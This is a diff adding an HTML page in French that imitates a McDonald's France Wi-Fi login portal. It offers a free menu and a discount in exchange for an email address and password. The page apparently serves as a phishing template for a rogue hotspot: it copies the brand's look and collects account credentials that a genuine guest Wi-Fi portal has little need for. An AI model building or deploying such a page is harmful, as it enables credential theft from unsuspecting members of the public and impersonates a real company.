@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion Wi-Fi - McDonald's</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background-color: #d6001c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        .logo img {
+            width: 160px;
+            margin-bottom: 25px;
+        }
+
+        .promo {
+            font-size: 16px;
+            color: #d6001c;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #ffc72c;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #000;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #e6a800;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="/logo.png" alt="Logo McDonald's">
+        </div>
+        <div class="promo">
+            Connectez-vous pour bénéficier d'un menu aléatoire gratuit et de -10% sur votre commande !
+        </div>
+        <form method="POST" action="/login">
+            <input type="email" name="email" placeholder="Adresse e-mail" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Connexion au Wi-Fi</button>
+        </form>
+        <div class="footer">
+            Ce réseau Wi-Fi est offert par McDonald's France.<br>
+            Une connexion à Internet sera disponible après authentification.
+        </div>
+    </div>
+</body>
+</html>
